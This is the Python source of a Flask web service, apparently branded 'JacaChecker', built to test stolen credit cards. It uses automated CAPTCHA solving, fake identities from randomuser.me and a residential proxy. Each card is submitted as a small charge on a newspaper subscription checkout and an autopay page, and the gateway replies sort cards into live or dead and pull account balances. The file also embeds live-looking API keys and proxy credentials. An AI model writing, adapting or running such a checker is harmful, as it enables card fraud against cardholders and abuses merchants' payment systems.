import csv
import json
from flask import Flask, request, render_template, jsonify
from flask_cors import CORS
import os
import http.client
import threading, requests, random, time, random, re
from urllib3 import disable_warnings
from colorama import Fore


disable_warnings()


app = Flask(__name__)

CORS(app)
    
def pegarItem(data, esquerda, direita):
    return data.partition(esquerda)[-1].partition(direita)[0]


def criarTask():
    data = {
        "clientKey": "5e8c9e3e72aa7154ea2682f577243fbd",
        "task": {
            "type": "RecaptchaV2TaskProxyless",
            "websiteURL": "https://everettweb.newzware.com/ss70v2/sound/common/template.jsp",
            "websiteKey": "6LeF47cUAAAAAMbDh0XxUukTdBNNF8xjOvWJ5Xtc",
        },
    }
    criar = requests.post(
        "https://api.capmonster.cloud/createTask", verify=False, json=data
    )
    taskId = criar.json()["taskId"]
    while True:
        data = {"clientKey": "5e8c9e3e72aa7154ea2682f577243fbd", "taskId": taskId}
        resultado = requests.post(
            "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
        )
        print(resultado.text)
        if '"status":"ready"' in resultado.text:
            return resultado.json()["solution"]["gRecaptchaResponse"]
        time.sleep(1)


def Saldo():
    data = {
        "clientKey": "5e8c9e3e72aa7154ea2682f577243fbd",
        "task": {
            "type": "RecaptchaV2EnterpriseTask",
            "websiteURL": "https://www.eduwhere.com/secure/autopay_confirm.php",
            "websiteKey": "6LfFHhQUAAAAAFFMGjELVU4DwN8oDECRFp1nCupe",
        },
    }
    criar = requests.post(
        "https://api.capmonster.cloud/createTask", verify=False, json=data
    )
    taskId = criar.json()["taskId"]
    while True:
        data = {"clientKey": "5e8c9e3e72aa7154ea2682f577243fbd", "taskId": taskId}
        resultado = requests.post(
            "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
        )
        print(resultado.text)
        if '"status":"ready"' in resultado.text:
            return resultado.json()["solution"]["gRecaptchaResponse"]
        
        
        
def api_bin(bin):
    try:
        req = requests.get(
            f"https://parrotv2.prod.pagosapi.com/cards?bin={bin}",
            headers={"x-api-key": "fe8d6db2967a4e77b4d7268448897c95"},
            verify=False,
        )
        if req.status_code == 200:
            try:
                tipo = req.json()["card"]["type"]
                nivel = req.json()["card"]["product"]["product_name"]
                banco = req.json()["card"]["bank"]["name"]
                try:
                    pais = req.json()["card"]["country"]["name"]
                except:
                    pais = "N/A"
                return f"{nivel} {tipo} {banco} {pais}".upper()
            except:
                return "SEM INFORMAÇÃO DA BIN"
        else:
            return "SEM INFORMAÇÃO DA BIN"
    except:
        return "SEM INFORMAÇÃO DA BIN"
    

class RequisicaoException(Exception):
    def __init__(self):
        super().__init__()


def reteste(card, month, year, cvv):
        checker(card, month, year, cvv)



def definir_tipo_cartao(card):
    if card.startswith("4"):
        return "VISA"
    elif card.startswith(("51", "52", "53", "54", "55")):
        return "MASTER"
    elif card.startswith(("34", "37")):
        return "American Express"
    elif card.startswith("6"):
        return "Discover"
    else:
        return "Desconhecido"
    
def retesteSaldo(card, month, year, cvv):
        saldo(card, month, year, cvv)
        
def saldo(card, month, year, cvv):
        try:    
        
            url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
            headers = {
                    'Host': 'randomuser.me',
                    'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
                    'accept': 'application/json, text/plain, */*',
                    'sec-ch-ua-mobile': '?0',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
                    'sec-ch-ua-platform': '"Windows"',
                    'origin': 'https://namso-gen.com',
                    'sec-fetch-site': 'cross-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://namso-gen.com/',
                    'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
                    }

            response = requests.get( url, headers=headers, verify=False)
            email = pegarItem(response.text, '"email":"','"')
            nome = pegarItem(response.text, '"first":"','"')
            sobrenome = pegarItem(response.text, '"last":"','"')
            street = pegarItem(response.text, '"name":"','"},"city"')
            snumber = pegarItem(response.text, '"street":{"number":',',')
            city = pegarItem(response.text, '"city":"','"')
            state = pegarItem(response.text, '"state":"','"')
            state = state[0:2].upper()
            postcode = pegarItem(response.text, '"postcode":',',')
            company = pegarItem(response.text, '"username":"','"')
            tel = random.randint(1111,9999)
            tel2 = random.randint(111,999)
            tel3 = random.randint(111,999)
            recap = Saldo()
            
            if len(year) == 4:
                year = year[2:]
            p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225'} 
            url = "https://www.eduwhere.com/secure/autopay_confirm.php"
            payload = f"pigID=nada&ssl_invoice_number=nadaPnada&ssl_amount=11&invnbr={tel}{tel2}&user_message=+&cctype=VISA&ssl_card_number={card}&exp_date_month={month}&exp_date_year={year}&ssl_cvv2cvc2=232&ssl_first_name={nome}&ssl_last_name={sobrenome}&ssl_company=MR&ssl_avs_address={snumber}+{street}&ssl_address2=&ssl_city={city}&ssl_state={state}&ssl_avs_zip={postcode}&billcountry=United+States&ap_ponumber=&g-recaptcha-response={recap}"
            headers = {
                'Host': 'www.eduwhere.com',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                }
            response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False, proxies=p)
            if 'ssl_account_balance' in response.text:
                dolar = pegarItem(response.text, '&amp;ssl_account_balance=','&')
                return dolar
 
            
            
        except requests.exceptions.ProxyError:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
            retesteSaldo(card, month, year, cvv)
        except requests.exceptions.ConnectionError:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO ConnectionError: {card}|{month}|{year}|{cvv}")
            retesteSaldo(card, month, year, cvv)
        except requests.exceptions.RequestException:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
            retesteSaldo(card, month, year, cvv)
    
    
def checker(card, month, year, cvv):
    time.sleep(5)
    try:
        url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
        headers = {
                'Host': 'randomuser.me',
                'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
                'accept': 'application/json, text/plain, */*',
                'sec-ch-ua-mobile': '?0',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
                'sec-ch-ua-platform': '"Windows"',
                'origin': 'https://namso-gen.com',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://namso-gen.com/',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
                }

        response = requests.get( url, headers=headers, verify=False)
        email = pegarItem(response.text, '"email":"','"')
        nome = pegarItem(response.text, '"first":"','"')
        sobrenome = pegarItem(response.text, '"last":"','"')
        street = pegarItem(response.text, '"name":"','"},"city"')
        snumber = pegarItem(response.text, '"street":{"number":',',')
        city = pegarItem(response.text, '"city":"','"')
        state = pegarItem(response.text, '"state":"','"')
        state = state[0:2].upper()
        postcode = pegarItem(response.text, '"postcode":',',')
        company = pegarItem(response.text, '"username":"','"')
        tel = random.randint(1111,9999)
        tel2 = random.randint(111,999)
        tel3 = random.randint(111,999)
        
        
        if response.status_code == 200:
            
            p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225'}
            start_time = time.time() 


            url = "https://ssmnpg.com/ss70v2/npg/custom/npgstart.jsp?rateid=6071&site=npg&rpage=https://www.newspressnow.com/"
            payload = {}
            headers = {
            'Host': 'ssmnpg.com',
            'Cookie': 'JSESSIONID=3f0L1t-CxFpQSun8sZ8cDCDeYeRO81IM5zPbzMky.ssmngp.com; nwssmcookie=ssm',
            'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': 'https://www.newspressnow.com/',
            'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
            }

            response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
            sessao = response.cookies.get('JSESSIONID')




            url = f"https://ssmnpg.com/newzlib/jsp/common/login_exists.jsp?site=npg&login_id={email}"
            payload = "dataType=xml&type=POST"
            headers = {
                'Host': 'ssmnpg.com',
                'Cookie': f'JSESSIONID={sessao}; nwssmcookie=ssm',
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'x-requested-with': 'XMLHttpRequest',
                'sec-ch-ua-mobile': '?0',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'sec-ch-ua-platform': '"Windows"',
                'origin': 'https://ssmnpg.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://ssmnpg.com/ss70v2/npg/custom/npgstart.jsp?rateid=6071&site=npg&rpage=https://www.newspressnow.com/',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
                }
            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
            sessao = response.cookies.get('JSESSIONID')



            url = "https://ssmnpg.com/newzlib/jsp/common/clean_address.jsp?site=npg&edition=NP&street=23937%20Rancho%20Ct&city=Valencia&state=CA&zip=91354&country=US&route=Y"
            payload = "https://ssmnpg.com/newzlib/jsp/common/clean_address.jsp?site=npg&edition=NP&street=23937%20Rancho%20Ct&city=Valencia&state=CA&zip=91354&country=US&route=Y"
            headers = {
                'Host': 'ssmnpg.com',
                'Cookie': f'JSESSIONID={sessao}; nwssmcookie=ssm',
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'sec-ch-ua-mobile': '?0',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'sec-ch-ua-platform': '"Windows"',
                'accept': '*/*',
                'origin': 'https://ssmnpg.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://ssmnpg.com/ss70v2/npg/custom/npgstart.jsp?rateid=6071&site=npg&rpage=https://www.newspressnow.com/',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'Content-Type': 'text/plain'
                }
            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
            sessao = response.cookies.get('JSESSIONID')



            if len(year) == 4:
                        year = year[2:]
            url = "https://ssmnpg.com/newzlib/jsp/ci/calculate.jsp?site=npg&retail_rate=6071&d_street=23937%20Rancho%20Ct&d_city=Valencia&d_zip=91354&d_state=CA&d_country=undefined&grat_amt=0.00&nie_amt=0&useZip=false"
            payload = "https://ssmnpg.com/newzlib/jsp/ci/calculate.jsp?site=npg&retail_rate=6071&d_street=23937%20Rancho%20Ct&d_city=Valencia&d_zip=91354&d_state=CA&d_country=undefined&grat_amt=0.00&nie_amt=0&useZip=false"
            headers = {
                'Host': 'ssmnpg.com',
                'Cookie': f'JSESSIONID={sessao}; nwssmcookie=ssm',
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'sec-ch-ua-mobile': '?0',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'sec-ch-ua-platform': '"Windows"',
                'accept': '*/*',
                'origin': 'https://ssmnpg.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://ssmnpg.com/ss70v2/npg/custom/npgstart.jsp?rateid=6071&site=npg&rpage=https://www.newspressnow.com/',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'Content-Type': 'text/plain'
                }

            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
            sessao = response.cookies.get('JSESSIONID')
            recap = criarTask()



            url = f"https://ssmnpg.com/newzlib/jsp/ci/new_start.jsp?site=npg&fname=james&lname=dean&b_fname=james&b_lname=dean&email={email}&copies=1&h_phone=661-214-7345&d_street=23937%20Rancho%20Ct&d_city=Valencia&d_state=CA&d_zip=91354&d_country=US&firmline=&b_street=23937%20Rancho%20Ct&b_city=Valencia&b_state=CA&b_zip=91354&b_country=US&cc_num={card}&cc_type=VISA&cc_cid=232&cc_exp_date={month}%2F{year}&cc_holder=james%20dean&acct_num=&acct_type=Checking&acct_receiving=&debit_day=0&retail_rate=6071&pay_method=C&recurring=N&tax_amt=0.00&net_amt=10.00&gratuity=0.00&subtotal_amt=10.00&ju_id=0&route=SSMROUTE&promoCode=&login_id={email}&password=radask10&createOnlineAccount=Y&oneTimeForRecurring=Y&nwCapChallenge={recap}&isV2=Y"
            payload = f"https://ssmnpg.com/newzlib/jsp/ci/new_start.jsp?site=npg&fname=james&lname=dean&b_fname=james&b_lname=dean&email={email}&copies=1&h_phone=661-214-7345&d_street=23937%20Rancho%20Ct&d_city=Valencia&d_state=CA&d_zip=91354&d_country=US&firmline=&b_street=23937%20Rancho%20Ct&b_city=Valencia&b_state=CA&b_zip=91354&b_country=US&cc_num={card}&cc_type=VISA&cc_cid=232&cc_exp_date={month}%2F{year}&cc_holder=james%20dean&acct_num=&acct_type=Checking&acct_receiving=&debit_day=0&retail_rate=6071&pay_method=C&recurring=N&tax_amt=0.00&net_amt=10.00&gratuity=0.00&subtotal_amt=10.00&ju_id=0&route=SSMROUTE&promoCode=&login_id={email}&password=radask10&createOnlineAccount=Y&oneTimeForRecurring=Y&nwCapChallenge={recap}&isV2=Y"
            headers = {
                'Host': 'ssmnpg.com',
                'Cookie': f'JSESSIONID={sessao}; nwssmcookie=ssm',
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'sec-ch-ua-mobile': '?0',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'sec-ch-ua-platform': '"Windows"',
                'accept': '*/*',
                'origin': 'https://ssmnpg.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://ssmnpg.com/ss70v2/npg/custom/npgstart.jsp?rateid=6071&site=npg&rpage=https://www.newspressnow.com/',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'Content-Type': 'text/plain'
                }
            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
            
            elapsed_time = time.time() - start_time
            MSegundos = round(elapsed_time, 2)
            
            time.sleep(3)
            if 'Insufficient funds' in response.text:
                dolar = saldo(card, month, year, cvv)
                bin = api_bin(card[:6])              
                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: NSF  [ USD: {dolar} ]"                          
                #open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} NSF [{MSegundos}] #JacaChecker\n") 
                print(Fore.GREEN + f"{x} #JacaChecker") 
                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
                
            elif 'Unidentifiable error issuer generated' in response.text:
                dolar = saldo(card, month, year, cvv)
                bin = api_bin(card[:6])              
                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19  [ USD: {dolar} ]"                    
                #pen("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
                print(Fore.GREEN + f"{x} #JacaChecker") 
                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
                    
            elif 'expired' in response.text:  
                bin = api_bin(card[:6])
                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Card Expired [{MSegundos}] MS"     
                print(Fore.RED + f"{x} #JacaChecker")  
                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}  
                                        
            elif 'The specified account was not found' in response.text:  
                bin = api_bin(card[:6])
                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Account Not Found [{MSegundos}] MS"     
                print(Fore.RED + f"{x} #JacaChecker")  
                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"} 
                
            elif 'The account number failed to pass the LUHN' in response.text:  
                bin = api_bin(card[:6])
                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Invalid Card [{MSegundos}] MS"     
                print(Fore.RED + f"{x} #JacaChecker")  
                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
                
            elif 'Do not honor' in response.text:  
                bin = api_bin(card[:6])
                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Do Not Honor [{MSegundos}] MS"     
                print(Fore.RED + f"{x} #JacaChecker")  
                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
                
            elif 'Issuer has flagged this account as fraudulent' in response.text:  
                bin = api_bin(card[:6])
                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Suspected Fraud [{MSegundos}] MS"     
                print(Fore.RED + f"{x} #JacaChecker")  
                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
                
            elif 'Card has been restricted' in response.text:  
                bin = api_bin(card[:6])
                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Card has been restricted [{MSegundos}] MS"     
                print(Fore.RED + f"{x} #JacaChecker")  
                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
                
            else:
                
                print(Fore.RED + 'Gateway Timeout' + response.text)
                return {"code": 2, "mensagem": f"Gateway Timeout #JacaChecker<br>"}
                
                    


            
    except requests.exceptions.ProxyError:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
        reteste(card, month, year, cvv)
        
    except requests.exceptions.ConnectionError:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO ConnectionError: {card}|{month}|{year}|{cvv}")
        reteste(card, month, year, cvv)
    except requests.exceptions.RequestException:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
        reteste(card, month, year, cvv)
    except RequisicaoException:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO Location: {card}|{month}|{year}|{cvv}")
        reteste(card, month, year, cvv)
            


def processar_cartoes(card,mes,ano,cvv):
    try:
        if len(card) == 16 or len(card) == 15 and mes and ano and cvv:
            retorno = checker(card,mes,ano,cvv)
            return {"code": retorno["code"], "retorno": retorno["mensagem"]}
        else:
            return {"code": "", "retorno": "erro no formulario"}
    except:
        #retorno = reteste(card,mes,ano,cvv)
        return {"code": "", "retorno": "Exception !"}
    
    

            
            
@app.route('/', methods=['GET'])
def iniciarChk():
    return "@Engenieiro"


@app.route('/chk', methods=['GET'])
def chk():
    args = request.args
    print(args)
    card = args.get('card')
    mes = args.get('mes')
    ano = args.get('ano')
    cvv = args.get('cvv')
    return jsonify(processar_cartoes(card,mes,ano,cvv))



if __name__ == '__main__':
    app.run(host='localhost', port=5000, debug=True)
    
    
    
    

